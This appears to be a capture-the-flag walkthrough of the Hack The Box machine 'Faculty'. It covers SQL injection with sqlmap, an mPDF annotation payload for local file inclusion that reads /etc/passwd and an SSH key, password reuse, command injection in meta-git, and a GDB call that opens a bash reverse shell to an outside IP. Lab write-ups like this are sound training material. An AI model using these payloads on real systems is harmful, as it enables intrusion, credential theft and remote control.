Hack The Box : Faculty

IP=10.129.92.25

```
Nmap scan:
# Nmap 7.92 scan initiated Sun Jul  3 05:03:53 2022 as: nmap -sCV -o nmap 10.129.92.25
Nmap scan report for 10.129.92.25
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Faculty schedule system user login

http://faculty.htb/login.php

faculty admin login

http://faculty.htb/admin/login.php

sql injection is possible and response manupulation is possible

sql injection in login form
username parameter is vulunerable

```
sqlmap -r req.txt -p username 
```

Retriving databases

```
available databases [2]:
[*] information_schema
[*] scheduling_db 
```

Extract database tables

```
+---------------------+
| class_schedule_info |
| courses             |
| faculty             |
| schedules           |
| subjects            |
| users               |
+---------------------+
```
```
+----+---------------+---------+---------------------------+----------+
| id | name          | type    | password                  | username |
+----+---------------+---------+---------------------------+----------+
| 1  | Administrator | <blank> | 1fecbe762af147c1176a0fc20 | <blank>  |
+----+---------------+---------+---------------------------+----------+
```

After login thier is a function used to create pdf from Faculty List. It convert the html tempelete to pdf

html tempelete 

```
<h1><a name="top"></a>faculty.htb</h1><h2>Faculties</h2><table>	<thead>		<tr>			<th class="text-center">ID</th>			<th class="text-center">Name</th>			<th class="text-center">Email</th>			<th class="text-center">Contact</th></tr></thead><tbody><tr><td class="text-center">85662050</td><td class="text-center"><b>Blake, Claire G</b></td><td class="text-center"><small><b>cblake@faculty.htb</b></small></td> <td class="text-center"><small><b>(763) 450-0121</b></small></td></tr><tr><td class="text-center">30903070</td><td class="text-center"><b>James, Eric P</b></td><td class="text-center"><small><b>ejames@faculty.htb</b></small></td> <td class="text-center"><small><b>(702) 368-3689</b></small></td></tr><tr><td class="text-center">63033226</td><td class="text-center"><b>Smith, John C</b></td><td class="text-center"><small><b>jsmith@faculty.htb</b></small></td> <td class="text-center"><small><b>(646) 559-9192</b></small></td></tr></tboby></table>
```

Exploit this funtion lead to LFI

payload
```
<annotation file=\”/etc/passwd\” content=\”/etc/passwd\” icon=\”Graph\” title=\”Attached File: /etc/passwd\” pos-x=\”195\” />
```

Full payload
<h1><a name="top"></a>faculty.htb</h1><h2>Faculties</h2><table>	<thead>		<tr>			<th class="text-center">ID</th>			<th class="text-center">Name</th>			<th class="text-center">Email</th>			<th class="text-center">Contact</th></tr></thead><tbody><tr><td class="text-center">85662050</td><td class="text-center"><b>Blake, Claire G</b></td><td class="text-center"><small><b>cblake@faculty.htb</b></small></td> <td class="text-center"><small><b>(763) 450-0121</b></small></td></tr><tr><td class="text-center">30903070</td><td class="text-center"><b>James, Eric P</b></td><td class="text-center"><small><b>ejames@faculty.htb</b></small></td> <td class="text-center"><small><b>(702) 368-3689</b></small></td></tr><tr><td class="text-center">63033226</td><td class="text-center"><b>Smith, John C</b></td><td class="text-center"><small><b>jsmith@faculty.htb</b></small></td> <td class="text-center"><small><b>(646) 559-9192</b></small></td></tr></tboby></table><annotation file="/var/www/scheduling/admin/index.php" content="/home/developer/.ssh/id_rsa" icon=”Graph” title=”Attached File: /etc/passwd” pos-x=”195” />

Retreving passwd file

```bash
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

Retreving Database password from db_connect.php

"password:Co.met06aci.dly53ro.per"

Initial access as gbyolo

password resue

```
gbyolo:Co.met06aci.dly53ro.per
```
For deverloper

abusing meta-git

Bug report from HackerOne link=https://hackerone.com/reports/728040

Reading the developer id_rsa 
sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'

ssh as user developer

privilege escalation using Linux capabilities 

Linux capabilities provide a subset of the available root privileges to a process

about Linux capabilites

Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions.

In this box the user developer in Debug group and gdb is also in the debug group
so we can run the GDB as root privilege

Abusing GDB

If GDB is installed you can debug a process from the host and make it call the system function. (This technique also requires the capability SYS_ADMIN)

Attaching root process and make a system call for run the cmd as root

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```